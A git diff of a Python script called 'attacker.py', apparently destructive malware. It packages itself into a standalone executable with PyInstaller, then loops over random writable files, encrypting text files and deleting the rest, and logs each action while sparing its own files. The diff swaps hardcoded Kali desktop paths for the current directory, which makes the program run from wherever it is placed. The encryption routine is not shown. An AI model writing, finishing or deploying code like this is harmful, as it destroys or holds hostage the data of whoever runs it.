@@ -9,11 +9,11 @@ colorama.init()
   
 ############################################################################################################################################################
 
-print("installation")   
+print("installation")
 os.system("pip install -U pyinstaller")
 os.system("python3 -m PyInstaller --onefile main.py")
-print("installation done")
-sleep(1)
+directory = os.getcwd()
+time.sleep(1)
 
 Files_Table = [] #a table contaning all writable files
 Text_Files_Table = [] #a table contaning all writable TEXT files
@@ -67,7 +67,7 @@ while True:
 	found = False
 
 	##################################### encrypting a file: ########################################
-	if Text_Files_Table[randomeNumberOfTextFiles] == "/home/kali/Desktop/attacker.py" or Text_Files_Table[randomeNumberOfTextFiles] == "/home/kali/Desktop/encryptedfiles.txt" or Text_Files_Table[randomeNumberOfTextFiles] == "/home/kali/Desktop/deletedfiles.txt":
+	if Text_Files_Table[randomeNumberOfTextFiles] == directory+"/attacker.py" or Text_Files_Table[randomeNumberOfTextFiles] == directory+"/encryptedfiles.txt" or Text_Files_Table[randomeNumberOfTextFiles] == directory+"/deletedfiles.txt":
 		continue
 	else:
 		f3 = open("encryptedfiles.txt","r")
@@ -98,7 +98,7 @@ while True:
 			time.sleep(5)
 	
 	##################################### deleting a file: #####################################
-	if NonText_Files_Table[randomeNumberOfNonTextFiles] == "/home/kali/Desktop/attacker.py":
+	if NonText_Files_Table[randomeNumberOfNonTextFiles] == directory+"/attacker.py":
 		continue
 	else:
 		try:
